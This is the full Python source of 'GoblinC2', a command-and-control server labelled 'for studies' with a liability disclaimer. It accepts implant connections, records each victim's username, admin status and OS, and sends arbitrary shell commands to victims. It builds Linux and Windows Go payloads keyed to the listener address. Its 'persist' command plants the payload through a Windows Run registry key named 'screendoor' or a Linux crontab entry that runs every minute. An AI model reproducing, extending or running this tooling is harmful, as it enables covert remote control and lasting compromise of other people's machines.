#!/usr/bin/python3

# About GoblinC2
# --------------------------- #
# [-] Developed by: H0ru
# [-] Developed for studies! 
# [!] Warning: The author of this program is not responsible for the problems caused by using this tool.
# --------------------------- #

import base64
import os
import os.path
import random
import shutil
import socket
import string
import subprocess
import threading
import time
from datetime import datetime
from prettytable import PrettyTable

#Colors
red = '\033[91m'
green = '\033[92m'
yellow = '\033[93m'
purple = '\033[95m'
reset = '\033[0m'


def banner():
    print(fr''' {red}
  _______________ ___.   .__  ____       _________  ________  
 /  _____/\   _  \\_ |__ |  |/_   | ____ \_   ___ \ \_____  \ 
/   \  ___/  /_\  \| __ \|  | |   |/    \/    \  \/  /  ____/ 
\    \_\  \  \_/   \ \_\ \  |_|   |   |  \     \____/       \ 
 \______  /\_____  /___  /____/___|___|  /\______  /\_______ \
        \/       \/    \/              \/        \/         \/
                            ,      ,
                           /(.-""-.)\
                       |\  \/      \/  /|
                       | \ / =.  .= \ / |
                       \( \   o\/o   / )/
                        \_, '-/  \-' ,_/
                          /   \__/   \
                          \ \__/\__/ /
                        ___\ \|--|/ /___
                      /`    \      /    `\
                     /       '----'       \

{reset}
                    {purple}——==[[乃ㄚ 卄0尺ㄩ]]==——{reset}
''')

def comm_in(targ_id):
    print(f'[{green}+{reset}] From client: ')
    response = targ_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response

def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def kill_sig(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def target_comm(targ_id, targets, num):
    while True:
        message = input(f'{red}[{targets[num][3]}]➤{reset} ')
        if len(message) == 0:
            continue
        if message == 'help' or message == '?':
            helpsession()
            pass
        elif message == 'exit' or message == 'x':
            message = base64.b64encode(message.encode())
            targ_id.send(message)
            targ_id.close()
            targets[num][7] = 'Dead'
            print(f'[{red}!{reset}] Session terminated.')
            break
        elif message == 'background' or message == 'bg':
            break
        elif message == 'persist' or message == 'pt':
            payload_name = input(f'[{green}!{reset}] Enter the name of the payload to add to persistence: ')
            if targets[num][6] == 1:
                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                persist_command_1 = base64.b64encode(persist_command_1.encode())
                targ_id.send(persist_command_1)
                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                persist_command_2 = base64.b64encode(persist_command_2.encode())
                targ_id.send(persist_command_2)
                print(f'[{yellow}!{reset}] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
            elif targets[num][6] == 2:
                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                persist_command = base64.b64encode(persist_command.encode())
                targ_id.send(persist_command)
                print(f'[{green}+{reset}] Persistence technique completed!')
        else:
            comm_out(targ_id, message)
            response = comm_in(targ_id)
            if response == 'exit':
                print(f'[{yellow}!{reset}] The client has terminated the session.')
                targ_id.close()
                targets[num][7] = 'Dead'
                break
            print(response)

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print(f'[{yellow}!{reset}] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            username = base64.b64decode(username).decode()
            admin = remote_target.recv(1024).decode()
            admin = base64.b64decode(admin).decode()
            op_sys = remote_target.recv(4096).decode()
            op_sys = base64.b64decode(op_sys).decode()
            if admin == 1:
                admin_val = 'Yes'
            elif username == 'root':
                admin_val = 'Yes'
            else:
                admin_val = 'No'
            if 'Windows' in op_sys:
                pay_val = 1
            else:
                pay_val = 2
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append(
                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val, 'Active'])
                print(f'\n[{green}+{reset}] Connection received from {remote_ip[0]}\n{yellow}PRESS ENTER{reset}', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val, 'Active'])
                print(f'\n[{green}+{reset}] Connection received from {remote_ip[0]}\n{yellow}PRESS ENTER{reset}', end="")
        except:
            pass

def linplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.go'
    current_dir = os.path.dirname(os.path.abspath(__file__))
    linplant_file = os.path.join(current_dir, 'lin.go')

    if os.path.exists(linplant_file):
        shutil.copy(linplant_file, file_name)
        with open(file_name) as f:
            new_host = f.read().replace('INPUT_IP_HERE', host_ip)
        with open(file_name, 'w') as f:
            f.write(new_host)
        
        with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
        with open(file_name, 'w') as f:
            f.write(new_port)

        if os.path.exists(f'{file_name}'):
            print(f'[{green}!{reset}] {file_name} saved to {current_dir}, now use:\nGOOS=linux GOARCH=amd64 go build {file_name}')
        else:
            print(f'[{red}!{reset}] Some error occurred with generation. ')
    else:
        print(f'[{yellow}!{reset}] lin.go file not found.')

def winplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.go'
    current_dir = os.path.dirname(os.path.abspath(__file__))
    winplant_file = os.path.join(current_dir, 'win.go')

    if os.path.exists(winplant_file):
        shutil.copy(winplant_file, file_name)
        with open(file_name) as f:
            new_host = f.read().replace('INPUT_IP_HERE', host_ip)
        with open(file_name, 'w') as f:
            f.write(new_host)
        
        with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
        with open(file_name, 'w') as f:
            f.write(new_port)

        if os.path.exists(f'{file_name}'):
            print(f'[{green}!{reset}] {file_name} saved to {current_dir}, now use:\nGOOS=windows GOARCH=amd64 go build {file_name}')
        else:
            print(f'[{red}!{reset}] Some error occurred with generation. ')
    else:
        print(f'[{yellow}!{reset}] win.go file not found.')


def helpsession():
    print(f'''
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         {green}Sessions Commands{reset}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{red}+{reset}] help or ?                   👉 Show Help Menu
[{red}+{reset}] exit or x                   👉 Terminates the current session
[{red}+{reset}] persist or pt               👉 Use a persistence technique
[{red}+{reset}] background or bg            👉 Backgrounds the current session
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')  

def help():
    print(f'''
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                        
          {green}Menu Commands{reset}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{red}+{reset}] help or ?                   👉 Show Help Menu
[{red}+{reset}] exit or x                   👉 Exits C2
[{red}+{reset}] listener or lt              👉 Generate a New Listener
[{red}+{reset}] lin                         👉 Generate a Linux Payload
[{red}+{reset}] win                         👉 Generate a Windows Payload
[{red}+{reset}] sessions -l                 👉 List Sessions
[{red}+{reset}] sessions -i <id>            👉 Enter a New Session
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')

if __name__ == '__main__':
    targets = []
    listener_counter = 0
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            command = input(f'{red}(👺)~>{reset} ')
            if command == 'help' or command == '?':
                help()
            if command == 'listener' or command == 'lt':
                host_ip = input(f'[{green}+{reset}] IP to listen on: ')
                host_port = input(f'[{green}+{reset}] Port to listen: ')
                listener_handler()
                listener_counter += 1
            if command == 'win':
                if listener_counter > 0:
                    winplant()
                else:
                    print(f'[{red}!{reset}] You cannot generate a payload without an active listener!')
            if command == 'lin':
                if listener_counter > 0:
                    linplant()
                else:
                    print(f'[{red}!{reset}] You cannot generate a payload without an active listener.')

            if command.startswith('sessions'):
                if len(command.split()) == 1:
                    print(f"[{yellow}!{reset}] Missing parameter. Usage: sessions -l or sessions -i <session_id>")
                else:
                    subcommand = command.split()[1]
                    if subcommand == '-l':
                        myTable = PrettyTable()
                        myTable.field_names = [f'{green}Session{reset}', f'{green}Status{reset}', f'{green}Username{reset}', f'{green}Admin{reset}', f'{green}Target{reset}', f'{green}Operating System{reset}', f'{green}Check-In Time{reset}']
                        myTable.padding_width = 3
                        for session_counter, target in enumerate(targets):
                            myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
                        print(myTable)
                    elif subcommand == '-i':
                        try:
                            num = int(command.split()[2])
                            if 0 <= num < len(targets):
                                targ_id = targets[num][0]
                                if targets[num][7] == 'Active':
                                    target_comm(targ_id, targets, num)
                                else:
                                    print(f'[{yellow}!{reset}] You cannot interact with a dead session.')
                            else:
                                print(f'[{yellow}!{reset}] Session {num} does not exist.')
                        except (ValueError, IndexError):
                            print(f"[{yellow}!{reset}] Invalid session number.")
                    else:
                        print(f"[{red}!{reset}] Invalid parameter! Usage: sessions -l or sessions -i <session_id>")

            if command == 'exit' or command == 'x':
                quit_message = input(f'[{yellow}!{reset}] Exit? (y/n) ').lower()
                if quit_message == 'y':
                    tar_length = len(targets)
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else:
                            comm_out(target[0], 'exit')
                    kill_flag = 1
                    if listener_counter > 0:
                        sock.close()
                    break
                else:
                    continue

        except KeyboardInterrupt:
            quit_message = input(f'\n[{yellow}!{reset}] Exit? (y/n) ').lower()
            if quit_message == 'y':
                tar_length = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        comm_out(target[0], 'exit')
                kill_flag = 1
                if listener_counter > 0:
                    sock.close()
                break
            else:
                continue
